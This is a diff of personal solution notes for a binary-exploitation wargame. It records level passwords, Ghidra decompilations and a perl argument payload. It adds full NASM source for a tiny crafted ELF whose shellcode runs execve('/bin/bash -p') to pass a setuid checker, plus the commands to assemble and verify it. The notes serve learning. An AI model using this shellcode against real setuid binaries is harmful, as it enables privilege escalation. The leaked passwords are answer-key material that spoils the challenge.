@@ -5,7 +5,7 @@ Level:     0
 Exploit:   Race Condition
 Password:  kfL7RRfpkY
 
-Exploit mitigations: NX, stack canaries
+Exploit mitigations: stack canary & NX
 
 ghidra decompile:
   int main(int argc,char **argv) {
@@ -150,7 +150,7 @@ Level:     3
 Exploit:   reverse engineering
 Password:  vghylBpihH
 
-Exploit mitigations was runtime encryption
+Exploit mitigations: runtime encryption
 
 Running the binary gives us the following
 $ ./maze3
@@ -189,7 +189,7 @@ Rough decompilation:
   // pop %eax simulated by reading an int pointer (simulate)
   int *ptr = (int *)eax; // eax was 0x7d before, but pop eax is unknown here, simulate with eax
   // Compare *(int *)eax with 0x1337c0de
-  if (ptr && *ptr == 0x1337c0de) {          <-- Satisfying this condition gives shell
+  if (ptr && *ptr == 0x1337c0de) {                   <-- Satisfying this condition gives shell
     ebx = 0x3a9c;
     eax = 0x46; // push 0x46; pop eax
 
@@ -219,10 +219,10 @@ $ ./maze3 $(perl -e 'print "\xde\xc0\x37\x13"')
 ――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
 
 Level:     4
-Exploit:   
-Password:  
+Exploit:   reverse engineering
+Password:  fobwgnzRy0
 
-Exploit mitigations stack canary & NX
+Exploit mitigations: stack canary & NX
 
 ghidra decompile
 int main(int argc,char **argv) {
@@ -237,26 +237,26 @@ int main(int argc,char **argv) {
   Elf32_Ehdr ehdr;
 
   iVar1 = *(int *)(in_GS_OFFSET + 0x14);
-  if (argc != 2) {                               <-- filename arg
+  if (argc != 2) {                                    <-- filename arg
     printf("usage: %s file2check\n",*argv);
     /* WARNING: Subroutine does not return */
     exit(-1);
   }
-  __fd = open(argv[1],0);                        <-- open file
+  __fd = open(argv[1],0);                             <-- open file
   if (__fd < 0) {
     perror("open");
     /* WARNING: Subroutine does not return */
     exit(-1);
   }
-  iVar2 = stat(argv[1],(stat *)&st);             <-- get stats
+  iVar2 = stat(argv[1],(stat *)&st);                  <-- get stats
   if (iVar2 < 0) {
     perror("stat");
     /* WARNING: Subroutine does not return */
     exit(-1);
   }
-  read(__fd,&ehdr,0x34);                         <-- read elf header
-  lseek(__fd,ehdr.e_phoff,0);                    <-- goto program header
-  read(__fd,&phdr,0x20);                         <-- read elf program header 
+  read(__fd,&ehdr,0x34);                              <-- read elf header
+  lseek(__fd,ehdr.e_phoff,0);                         <-- goto first program header
+  read(__fd,&phdr,0x20);                              <-- read elf program header 
 	// Checks if phdr.p_addr (physical addr of beginning of segment = elf id byte 7 * byte 8
   if ((phdr.p_paddr == (uint)ehdr.e_ident[8] * (uint)ehdr.e_ident[7]) && (st.st_size < 0x7c)) {
     puts("valid file, executing");
@@ -271,9 +271,82 @@ int main(int argc,char **argv) {
   return 0;
 }
 
-Must craft an elf file to pass condition on phdr and ehdr
-Then pass in the program we would like to execute to arg1, so /bin/bash
+Must craft an elf file to pass condition on phdr, ehdr, and file size. It must also contain instrs
+to open shell. Total file size must be less than 128 bytes
 
+BITS 32
+; ELF Header (52 bytes)
+org 0x08048000          ; Use a standard load address
+
+ehdr:
+; e_ident (16 bytes)
+  db 0x7F, "ELF"      ; Magic bytes (0-3)
+  db 1                ; Class: 32-bit (4)
+  db 1                ; Data: Little Endian (5)
+  db 1                ; Version: 1 (6)
+  db 0x2              ; [TARGET] e_ident[7] (OSABI) <--- CHANGE THIS
+  db 0x1              ; [TARGET] e_ident[8] (ABIVERSION) <--- CHANGE THIS
+  db "AABBCCD"         ; Padding (9-15)
+
+  dw 2                ; e_type: ET_EXEC (Executable file)
+  dw 3                ; e_machine: EM_386 (Intel 80386)
+  dd 1                ; e_version: EV_CURRENT
+  dd _start           ; e_entry: Memory address where code starts
+  dd phdr - ehdr      ; e_phoff: Offset to Program Header (Start of Phdr)
+  dd 0                ; e_shoff: Section header table offset (0 = none)
+  dd 0                ; e_flags
+  dw ehdr_size        ; e_ehsize: Size of this header (52)
+  dw phdr_size        ; e_phentsize: Size of program header entry (32)
+  dw 1                ; e_phnum: Number of program headers
+  dw 0                ; e_shentsize: Section header entry size (0)
+  dw 0                ; e_shnum: Number of section headers (0)
+  dw 0                ; e_shstrndx: String table index (0)
+
+ehdr_size equ $ - ehdr
+
+; Program Header (32 bytes)
+phdr:
+  dd 1                ; p_type: PT_LOAD
+  dd 0                ; p_offset: Start of file
+  dd 0x08048000       ; p_vaddr: Virtual address in memory
+  dd 0x2              ; p_paddr: Physical Address
+  dd filesize         ; p_filesz: Size in file
+  dd filesize         ; p_memsz: Size in memory
+  dd 7                ; p_flags: RWX (Read, Write, Execute)
+  dd 0x1000           ; p_align: Alignment (4096)
+
+phdr_size equ $ - phdr
+
+; Code Section (must be less than 40 bytes)
+_start:
+  xor eax, eax        ; EAX = 0 (Used for NULLs)
+  push eax            ; Null terminator for "-p"
+  push word 0x702d    ; Push "-p" (0x70='p', 0x2d='-')
+  mov esi, esp        ; ESI = Pointer to "-p"
+
+  push eax            ; Null terminator
+  push 0x68736162     ; "bash"
+  push 0x2f6e6962     ; "bin/"
+  push 0x2f2f2f2f     ; "////" (Padding)
+  mov ebx, esp        ; EBX = Pointer to "/bin/bash"
+
+  push eax            ; Push NULL (End of array)
+  push esi            ; Push Pointer to "-p"
+  push ebx            ; Push Pointer to "/bin/bash"
+  mov ecx, esp        ; ECX = Pointer to the array (argv)
+
+  xor edx, edx        ; EDX = 0 (envp = NULL)
+  mov al, 11          ; Syscall 11 (execve)
+  int 0x80
+
+filesize equ $ - ehdr
+
+The payload or "functionality" of crafted elf file is to call execve("\bin\bash", -p, NULL)
+Assemble and verify that the crafted elf file verifies the condition
+$ nasm -f bin exploit.asm -o exploit
+$ wc exploit  // must be less than 124
+$ readelf -h exploit
+$ readelf -l exploit 
 
 ――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
 
